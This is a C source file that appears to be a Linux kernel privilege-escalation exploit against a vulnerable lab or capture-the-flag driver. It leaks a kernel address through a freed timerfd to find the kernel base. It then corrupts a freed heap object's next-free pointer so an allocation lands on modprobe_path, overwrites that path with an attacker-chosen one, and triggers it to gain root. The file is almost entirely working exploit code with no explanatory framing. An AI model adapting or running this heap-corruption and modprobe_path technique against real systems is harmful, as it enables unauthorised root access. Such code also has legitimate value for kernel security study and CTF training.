#include "libpwn.c"
#define PTMX_SPRAY (size_t)50       // Number of terminals to allocate
#define MSG_SPRAY (size_t)32        // Number of msg_msg's per queue
#define NUM_QUEUE (size_t)4         // Number of msg queues
#define MSG_SZ (size_t)512          // Size of each msg_msg, modulo 8 == 0
#define GBUF_SZ (size_t)0x400       // Size of g_buf in driver


int main(){
  fd = open(DEV_PATH, O_RDWR);

  // Leak with timer_tfd
  struct itimerspec timespec = {{0, 0}, {100, 0}};
  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &timespec, 0);
  close(tfd);
  sleep(1);

  stagefinal_kalloc(0, 0x100);
  sleep(1);

  param req;
  req = stagefinal_read(0, malloc(0x100));
  dump_hex(req.buf, 0x100);

  // Info
  leak = ((unsigned long *)req.buf)[5];
  kernel_base = leak - 0x1fe6c0;
  modprobe_path = KADDR(0xffffffff824447a0);
  info("Leak", leak);
  info("Kbase", kernel_base);
  info("modprobe_path", modprobe_path);

  stagefinal_kalloc(1, 0xa8);
  req = stagefinal_read(1, malloc(0xa8));
  dump_hex(req.buf, 0xa8);
  heap = ((unsigned long *)req.buf)[0];
  info("Heap target", heap);
  ((unsigned long *)req.buf)[0] = modprobe_path; //Targeting modprobe modprobe path
  stagefinal_write(1, req.buf);
  stagefinal_migrates_dst_to_src(1, 1, 0xc0); //Overwrite next free pointer with modprobe path
  stagefinal_kalloc(2, 0xa8);
  stagefinal_kalloc(3, 0xa8); //Idx of modprobe path
  memset(req.buf, 0, 0xa0);
  memcpy(req.buf, DEFAULT_EVIL_MODPROBE_PATH, sizeof(DEFAULT_EVIL_MODPROBE_PATH));
  stagefinal_write(3, req.buf);
  ppause();
  abuse_modprobe();
  ppause();
}
